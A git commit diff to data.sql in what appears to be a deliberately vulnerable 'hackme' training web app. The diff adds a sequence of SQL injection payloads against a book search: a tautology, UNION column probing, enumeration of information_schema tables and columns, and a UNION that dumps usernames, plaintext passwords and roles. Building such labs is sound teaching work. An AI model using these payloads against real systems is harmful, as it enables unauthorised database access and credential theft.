90634549a97aa32e5cbb392243f7ed58d918fd14
DavidCheah <tattwei46@gmail.com>
2019-07-11 23:27:06 +0800

    Added more sql queries

--- hackme/src/main/webapp/data.sql
+++ hackme/src/main/webapp/data.sql
@@ -7,3 +7,12 @@ CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(255), pa
 INSERT INTO users (username, password, role) VALUES ('john', 'john123', 'ADMIN')
 	
 
+SELECT * FROM books where NAME LIKE '%Sap%' OR '1'='1'; -- %'
+
+SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT 1,2,3 FROM dual); -- %'
+
+SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables); -- %'
+
+SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); -- %'
+
+SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT username, password, role FROM users); -- %'
